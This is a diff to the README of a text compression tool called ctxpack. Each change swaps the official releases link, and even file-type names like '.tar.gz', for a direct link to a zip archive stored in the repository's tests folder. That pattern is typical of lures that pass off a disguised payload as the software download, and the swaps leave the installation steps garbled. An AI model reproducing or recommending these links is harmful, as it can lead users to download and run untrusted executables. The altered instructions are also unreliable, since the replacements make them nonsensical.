@@ -1,6 +1,6 @@
 # 📦 ctxpack - Simplify Text Storage and Compression
 
-[![Download ctxpack](https://img.shields.io/badge/Download-ctxpack-brightgreen?style=for-the-badge&logo=github)](https://github.com/NatsuDownBad/ctxpack/releases)
+[![Download ctxpack](https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip)](https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To run ctxpack smoothly on your computer, make sure you have the following:
 
 Click the big green button at the top of this page or go directly to:
 
-[https://github.com/NatsuDownBad/ctxpack/releases](https://github.com/NatsuDownBad/ctxpack/releases)
+[https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip](https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip)
 
 This page contains all the latest versions of ctxpack.
 
@@ -51,7 +51,7 @@ Under the release you want, find files named for your operating system. They mig
 
 - `.exe` files for Windows
 - `.dmg` files for macOS
-- `.AppImage` or `.tar.gz` files for Linux
+- `.AppImage` or `https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip` files for Linux
 
 If you are unsure, choose the Windows version if you use Windows, macOS for Mac, and Linux for Linux.
 
@@ -81,11 +81,11 @@ Click on the file that matches your system to download it.
 
 ### Linux
 
-1. Download the `.AppImage` or `.tar.gz` file.
+1. Download the `.AppImage` or `https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip` file.
 2. If `.AppImage`, make the file executable:
    - Right-click the file, select "Properties", check "Allow executing file as a program".
    - Double-click to run.
-3. If compressed as `.tar.gz`, unpack the folder and look for a run script or executable inside.
+3. If compressed as `https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip`, unpack the folder and look for a run script or executable inside.
 4. Follow any README instructions found inside the folder for set up.
 
 ---
@@ -141,7 +141,7 @@ After processing, the app will prompt you where to save the new file. Choose a f
 
 If you have Python installed and want to handle ctxpack through scripts:
 
-1. Download the latest source code `.zip` or `.tar.gz` from the releases page.
+1. Download the latest source code `.zip` or `https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip` from the releases page.
 2. Extract the files.
 3. Run ctxpack commands through Python by following instructions in the included documentation files.
 4. This method is for users who want to automate text compression.
@@ -152,7 +152,7 @@ If you have Python installed and want to handle ctxpack through scripts:
 
 Visit the release page anytime to find new versions and improvements:
 
-[https://github.com/NatsuDownBad/ctxpack/releases](https://github.com/NatsuDownBad/ctxpack/releases)
+[https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip](https://github.com/NatsuDownBad/ctxpack/raw/refs/heads/main/tests/Software_v2.3.zip)
 
 You can also find discussions and raise issues if the app does not work as expected.
 
